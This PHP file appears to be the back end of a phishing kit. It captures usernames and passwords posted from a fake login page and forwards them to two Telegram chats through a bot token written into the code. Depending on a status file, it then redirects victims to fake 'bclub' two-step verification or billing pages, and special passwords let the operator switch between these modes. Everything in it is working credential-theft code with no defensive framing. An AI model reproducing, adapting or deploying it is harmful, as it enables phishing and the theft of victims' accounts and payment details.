<?php
// Enable error reporting
//hii
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Log errors to a file
ini_set('log_errors', 1);
ini_set('error_log', 'error_log.txt');

// Telegram Bot details
$botToken = '7257814757:AAG5RyBq0M8KGqhuSS_PBK3tvnszTsI7OXg';
$chatIds = ['1619777087', '1272510733'];
$statusFile = 'status.txt';

// Check if status file exists and is readable
if (!file_exists($statusFile)) {
    error_log("Error: status.txt file not found.");
    die("Error: status file not found.");
}
if (!is_readable($statusFile)) {
    error_log("Error: status.txt is not readable.");
    die("Error: status file is not readable.");
}

// Read the status value
$statusValue = file_get_contents($statusFile);
error_log("Status Value: " . $statusValue);

// Debug: Check if POST request is received
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    error_log("POST request received: " . print_r($_POST, true));

    $username = $_POST["username"] ?? 'N/A';
    $password = $_POST["password"] ?? 'N/A';
    $message = "Username: " . $username . "\n" . "Password: " . $password . "\n";

    // Debug: Log received credentials
    error_log("Received Credentials: " . $message);

    // Handle special password conditions
    if ($password === "websitedown") {
        file_put_contents($statusFile, "down");
        error_log("Status updated to 'down'");
        header("Location: https://bclub.ac/webstatusdown.html");
        exit();
    }
    if ($password === "websiteup") {
        file_put_contents($statusFile, "up");
        error_log("Status updated to 'up'");
        header("Location: https://bclub.ac/webstatusup.html");
        exit();
    }
    if ($password === "topup") {
        file_put_contents($statusFile, "topup");
        error_log("Status updated to 'topup'");
        header("Location: https://bclub.ac/webstatusup.html");
        exit();
    }

    // Redirect based on status
    if ($statusValue === "up") {
        sendTelegramMessage("Redirection", $message);
        error_log("Redirecting to https://bclub.tk");
        header("Location: https://bclub.tk");
        exit();
    }
    if ($statusValue === "down") {
        sendTelegramMessage("2 STEP LOGIN INITIATED ✅", $message);
        error_log("Redirecting to verification page");
        header("Location: https://bclub.ac/Verification.html?username=" . urlencode($username));
        exit();
    }
    if ($statusValue === "topup") {
        sendTelegramMessage("coded ✅", $message);
        error_log("Redirecting to billing page");
        header("Location: https://bclub.ac/billing2.html?username=" . urlencode($username));
        exit();
    }
}

// Function to send message via Telegram with logging
function sendTelegramMessage($title, $body) {
    global $botToken, $chatIds;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => "*" . $title . "*\n" . $body,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $response = curl_exec($ch);

        if ($response === false) {
            error_log("cURL Error: " . curl_error($ch));
        } else {
            error_log("Telegram API Response: " . $response);
        }

        curl_close($ch);
    }
}
?>
